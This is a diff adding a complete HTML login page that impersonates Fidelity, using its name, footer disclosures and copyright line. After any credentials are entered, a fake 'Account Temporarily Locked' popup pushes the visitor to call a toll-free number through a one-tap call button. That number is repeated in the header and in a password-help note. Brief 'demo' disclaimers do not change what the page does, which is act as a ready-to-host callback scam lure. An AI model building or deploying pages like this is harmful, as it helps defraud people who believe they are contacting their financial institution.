@@ -1,0 +1,286 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Login</title>
+  <style>
+    :root{
+      --dark-green:#1E3A34;
+      --accent-green:#2E8B57;
+      --accent-green-dark:#256b45;
+      --muted:#6b6b6b;
+      --container-bg:#ffffff;
+      --error-red:#c92b2b;
+    }
+    *{box-sizing:border-box}
+    body{
+      font-family: "Segoe UI", Roboto, Arial, sans-serif;
+      background:#f5f7f6;
+      margin:0;
+      color:#222;
+    }
+
+    header{
+      background:var(--dark-green);
+      color:#fff;
+      padding:14px 20px;
+      display:flex;
+      align-items:center;
+      justify-content:space-between;
+      gap:12px;
+    }
+    header .brand{
+      font-weight:700;
+      letter-spacing:0.3px;
+      font-size:16px;
+    }
+    header .toll{
+      font-size:14px;
+      opacity:0.95;
+    }
+    .wrap{
+      max-width:420px;
+      margin:60px auto;
+      padding:28px;
+      background:var(--container-bg);
+      border-radius:8px;
+      box-shadow:0 6px 18px rgba(18,40,30,0.08);
+    }
+    h2{ color:var(--dark-green); margin:0 0 8px 0; text-align:center;}
+    p.lead{ text-align:center; color:var(--muted); margin-top:6px; margin-bottom:18px; font-size:14px;}
+    label{display:block; font-size:13px; margin-top:12px; color:#333;}
+    input[type="text"], input[type="password"]{
+      width:100%;
+      padding:10px 12px;
+      margin-top:6px;
+      border:1px solid #d7d7d7;
+      border-radius:6px;
+      font-size:15px;
+    }
+    .error {
+      color: var(--error-red);
+      font-size:13px;
+      margin-top:8px;
+    }
+    .input-row { position:relative; }
+    .input-row.has-error input {
+      border-color: var(--error-red);
+      box-shadow: 0 0 0 3px rgba(201,43,43,0.06);
+    }
+
+    .actions{ margin-top:20px; display:flex; gap:10px; flex-direction:column;}
+    button.primary{
+      background:var(--accent-green);
+      color:#fff;
+      border:none;
+      padding:11px;
+      border-radius:6px;
+      font-size:16px;
+      cursor:pointer;
+    }
+    button.primary:hover{ background:var(--accent-green-dark); }
+
+    footer{
+      max-width:840px;
+      margin:36px auto 60px auto;
+      background:#fbfbfb;
+      border-top:1px solid #eee;
+      padding:18px;
+      font-size:13px;
+      color:#3b3b3b;
+      line-height:1.45;
+      border-radius:6px;
+    }
+
+    /* Popup overlay */
+    .popup{
+      display:none;
+      position:fixed;
+      inset:0;
+      background:rgba(0,0,0,0.45);
+      align-items:center;
+      justify-content:center;
+      padding:20px;
+      z-index:9999;
+    }
+    .popup.show{ display:flex; }
+    .popup-card{
+      width:100%;
+      max-width:460px;
+      background:#fff;
+      border-radius:8px;
+      padding:20px;
+      box-shadow:0 10px 30px rgba(0,0,0,0.18);
+      text-align:left;
+    }
+    .popup-card h3{ margin:0 0 8px 0; color:var(--dark-green); }
+    .popup-card p{ margin:0 0 18px 0; color:#444; }
+    .popup-buttons{ display:flex; gap:10px; justify-content:flex-end; flex-wrap:wrap; }
+    a.call-btn{
+      text-decoration:none;
+      display:inline-flex;
+      align-items:center;
+      gap:8px;
+      background:#e8f9ef;
+      color:var(--accent-green-dark);
+      border:2px solid var(--accent-green);
+      padding:10px 14px;
+      border-radius:6px;
+      font-weight:600;
+    }
+    a.call-btn:hover{ background:#dff2e6; }
+    button.ghost{
+      background:transparent;
+      color:#444;
+      border:1px solid #d1d1d1;
+      padding:10px 14px;
+      border-radius:6px;
+      cursor:pointer;
+    }
+
+    /* small note to emphasize demo nature */
+    .demo-note{ margin-top:12px; font-size:13px; color:#666; }
+    @media (max-width:480px){
+      .wrap{ margin:24px 14px; padding:18px;}
+      header{ padding:12px;}
+    }
+  </style>
+</head>
+<body>
+
+<header>
+  <div class="brand">Secure Login Portal — Fidelity</div>
+  <div class="toll">Toll-free: <strong>+1 (888) 649-9916</strong></div>
+</header>
+
+<main>
+  <section class="wrap" aria-labelledby="login-title">
+    <h2 id="login-title">Member Login</h2>
+    <p class="lead">Enter Username and Password to Login</p>
+
+    <label for="username">Username</label>
+    <div id="row-username" class="input-row">
+      <input id="username" type="text" placeholder="Enter username" autocomplete="username" aria-describedby="err-username">
+      <div id="err-username" class="error" style="display:none">Please enter your username.</div>
+    </div>
+
+    <label for="password">Password</label>
+    <div id="row-password" class="input-row">
+      <input id="password" type="password" placeholder="Enter password" autocomplete="current-password" aria-describedby="err-password">
+      <div id="err-password" class="error" style="display:none">Please enter your password.</div>
+    </div>
+
+    <div class="actions">
+      <button id="btn-login" class="primary" type="button">Login</button>
+    </div>
+
+    <p class="demo-note"><em>Note:</em> Forget Username and Password? Call us on customer service +1-888-649-9916</p>
+  </section>
+</main>
+
+<!-- Popup -->
+<div id="popup" class="popup" role="dialog" aria-modal="true" aria-hidden="true">
+  <div class="popup-card" role="document">
+    <h3>Account Temporarily Locked</h3>
+    <p>Due to suspicious activity, your account has been temporarily locked. To unlock your account, please call Customer Service at <strong>+1 (888) 649-9916</strong>.</p>
+
+    <div class="popup-buttons" style="margin-top:8px;">
+      <!-- Call-only button: uses tel: so mobile phones can dial immediately -->
+      <a class="call-btn" href="tel:+18886499916" aria-label="Call customer service at +1 888 649 9916">
+        📞 Call Only
+      </a>
+
+      <!-- Close button -->
+      <button class="ghost" type="button" onclick="closePopup()">Close</button>
+    </div>
+
+    <p class="demo-note">This is a demo message and not connected to any real account or service.</p>
+  </div>
+</div>
+
+<footer>
+  <p><strong>National Financial Services LLC Statement of Financial Condition</strong></p>
+  <p>Use of this site involves the electronic transmission of personal financial information. Using this product is consent to such transmission of this information; such consent is effective at all times when using this site. Fidelity supports 128-bit browser encryption.</p>
+  <p>Before investing, consider the funds' investment objectives, risks, charges, and expenses. Contact Fidelity for a prospectus or, if available, a summary prospectus containing this information. Read it carefully.</p>
+  <p>©1998-2025 FMR LLC. All Rights Reserved.
+1159659.1.0</p>
+</footer>
+
+<script>
+  const popup = document.getElementById('popup');
+  const btnLogin = document.getElementById('btn-login');
+  const username = document.getElementById('username');
+  const password = document.getElementById('password');
+  const errUser = document.getElementById('err-username');
+  const errPass = document.getElementById('err-password');
+  const rowUser = document.getElementById('row-username');
+  const rowPass = document.getElementById('row-password');
+
+  function showPopup(){
+    popup.classList.add('show');
+    popup.setAttribute('aria-hidden', 'false');
+  }
+
+  function closePopup(){
+    popup.classList.remove('show');
+    popup.setAttribute('aria-hidden', 'true');
+  }
+
+  function clearErrors(){
+    errUser.style.display = 'none';
+    errPass.style.display = 'none';
+    rowUser.classList.remove('has-error');
+    rowPass.classList.remove('has-error');
+  }
+
+  // Validate fields before showing popup
+  btnLogin.addEventListener('click', (e) => {
+    clearErrors();
+    const u = username.value.trim();
+    const p = password.value.trim();
+    let focusSet = false;
+
+    if (!u) {
+      errUser.style.display = 'block';
+      rowUser.classList.add('has-error');
+      if (!focusSet) { username.focus(); focusSet = true; }
+    }
+    if (!p) {
+      errPass.style.display = 'block';
+      rowPass.classList.add('has-error');
+      if (!focusSet) { password.focus(); focusSet = true; }
+    }
+
+    // if both provided, show demo popup
+    if (u && p) {
+      showPopup();
+    }
+  });
+
+  // clear error on input
+  username.addEventListener('input', () => {
+    if (username.value.trim()) {
+      errUser.style.display = 'none';
+      rowUser.classList.remove('has-error');
+    }
+  });
+  password.addEventListener('input', () => {
+    if (password.value.trim()) {
+      errPass.style.display = 'none';
+      rowPass.classList.remove('has-error');
+    }
+  });
+
+  // close popup when clicking outside card
+  popup.addEventListener('click', (e) => {
+    if(e.target === popup) closePopup();
+  });
+
+  // allow Esc to close
+  window.addEventListener('keydown', (e) => {
+    if(e.key === 'Escape' && popup.classList.contains('show')) closePopup();
+  });
+</script>
+</body>
+</html>
